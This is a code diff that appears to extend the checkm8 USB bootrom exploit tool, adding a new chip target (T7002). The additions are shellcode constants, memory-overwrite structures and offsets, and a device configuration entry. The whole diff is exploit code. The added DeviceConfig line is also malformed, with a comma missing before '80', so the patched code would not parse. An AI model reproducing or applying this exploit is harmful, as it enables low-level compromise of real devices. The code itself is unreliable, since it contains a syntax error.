@@ -140,6 +140,30 @@ PAYLOAD_OFFSET_ARM64 = 384
 PAYLOAD_SIZE_ARM64   = 576
 
 def payload(cpid):
+  if cpid == 0x7002:
+    constants_usb_s7002 = [
+                0x46018000, # 1 - LOAD_ADDRESS
+                0x65786563, # 2 - EXEC_MAGIC
+                0x646F6E65, # 3 - DONE_MAGIC
+                0x6D656D63, # 4 - MEMC_MAGIC
+                0x6D656D73, # 5 - MEMS_MAGIC
+                  0x6E58+1, # 6 - USB_CORE_DO_IO
+    ]
+    constants_checkm8_s7002 = [
+                0x460057D8, # 1 - gUSBDescriptors
+                0x46005958, # 2 - gUSBSerialNumber
+                  0x6744+1, # 3 - usb_create_string_descriptor
+                0x4600034A, # 4 - gUSBSRNMStringDescriptor
+                0x46007800, # 5 - PAYLOAD_DEST
+      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
+        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
+                0x46005898, # 8 - PAYLOAD_PTR
+    ]
+    s7002_handler = asm_thumb_trampoline(0x46007800+1, 0x7080+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s7002)[8:]
+    s7002_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s7002)
+    assert len(s7002_shellcode) <= PAYLOAD_OFFSET_ARMV7
+    assert len(s7002_handler) <= PAYLOAD_SIZE_ARMV7
+    return s7002_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s7002_shellcode)) + s7002_handler
   if cpid == 0x8947:
     constants_usb_s5l8947x = [
                 0x34000000, # 1 - LOAD_ADDRESS
@@ -435,6 +459,7 @@ def all_exploit_configs():
   t8011_nop_gadget = 0x10000CD0C
   t8015_nop_gadget = 0x10000A9C4
 
+  t7002_overwrite    = struct.pack('<20xI4x', 0x34000000)
   s5l8947x_overwrite = struct.pack('<20xI4x', 0x34000000)
   s5l895xx_overwrite = struct.pack('<20xI4x', 0x10000000)
   t800x_overwrite    = struct.pack('<20xI4x', 0x48818000)
@@ -443,6 +468,7 @@ def all_exploit_configs():
   t8011_overwrite    = struct.pack('<32x2Q', t8011_nop_gadget, 0x1800B0800)
   t8015_overwrite    = struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
 
+  t7002_overwrite_offset    = 0x660
   s5l8947x_overwrite_offset = 0x660
   s5l895xx_overwrite_offset = 0x640
   t800x_overwrite_offset    = 0x5C0
@@ -452,6 +478,7 @@ def all_exploit_configs():
   t8015_overwrite_offset    = 0x500
 
   return [
+    DeviceConfig('iBoot-2098.0.0.2.4',    0x7002, None,    t7002_overwrite, t7002_overwrite_offset    80,    3), # T7002
     DeviceConfig('iBoot-1458.2',          0x8947,  626, s5l8947x_overwrite, s5l8947x_overwrite_offset, None, None), # S5L8947 (DFU loop)     1.97 seconds
     DeviceConfig('iBoot-1145.3'  ,        0x8950,  659, s5l895xx_overwrite, s5l895xx_overwrite_offset, None, None), # S5L8950 (buttons)      2.30 seconds
     DeviceConfig('iBoot-1145.3.3',        0x8955,  659, s5l895xx_overwrite, s5l895xx_overwrite_offset, None, None), # S5L8955 (buttons)      2.30 seconds
